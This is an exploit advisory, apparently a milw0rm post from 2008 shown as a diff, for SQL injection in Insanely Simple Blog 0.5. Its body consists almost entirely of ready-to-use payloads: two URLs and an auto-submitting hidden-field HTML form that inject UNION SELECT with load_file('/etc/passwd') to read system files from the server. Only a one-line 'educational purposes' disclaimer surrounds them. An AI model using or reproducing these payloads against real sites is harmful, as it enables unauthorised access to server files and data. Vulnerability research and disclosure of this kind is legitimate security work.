@@ -1,0 +1,47 @@
+  _____ _   _ _____  _____ _____ _____  
+ /  ___| |_| |  _  \|  _  |  _  |_   _| 
+ | (___|  _  | [_)_/| (_) | (_) | | |   
+ \_____|_| |_|_| |_||_____|_____| |_|   
+        C. H. R. O. O. T.  SECURITY  GROUP
+        - -- ----- --- -- -- ---- --- -- - 
+                     http://www.chroot.org
+
+                          _   _ _ _____ ____ ____ __  _ 
+        Hacks In Taiwan  | |_| | |_   _|  __|    |  \| |
+        Conference 2008  |  _  | | | | | (__| () |     |
+                         |_| |_|_| |_| \____|____|_|\__|
+                                      http://www.hitcon.org
+
+
+Title =======:: Insanely Simple Blog 0.5 (index) Remote SQL Injection Vulnerabilities
+
+Author ======:: unohope [at] chroot [dot] org
+
+IRC =========:: irc.chroot.org #chroot
+
+ScriptName ==:: Insanely Simple Blog 
+
+Download ====:: http://jaist.dl.sourceforge.net/sourceforge/insanelysimple2/insanely_simple_blog0.5.zip
+
+Mirror ======:: http://www.badongo.com/file/9706939
+
+______________________
+[SQL Injection]
+
+- {index.php} -
+
+http://localhost/isblog/index.php?id=-99+union+select+0,1,2,3,4,5,6,load_file('/etc/passwd'),8/*
+
+http://localhost/isblog/index.php?current_subsection=-99+union+select+0,1,2,3,4,5,6,load_file('/etc/passwd'),8/*
+
+<form action="http://localhost/isblog/index.php?action=search" method="post">
+<input type="hidden" name="term" value="-99' union select 0,1,2,3,4,5,6,load_file('/etc/passwd'),8/*">
+<input type="submit" value="send">
+</form>
+
+______
+[NOTE]
+
+!! This is just for educational purposes, DO NOT use for illegal. !!
+
+# milw0rm.com [2008-06-10]
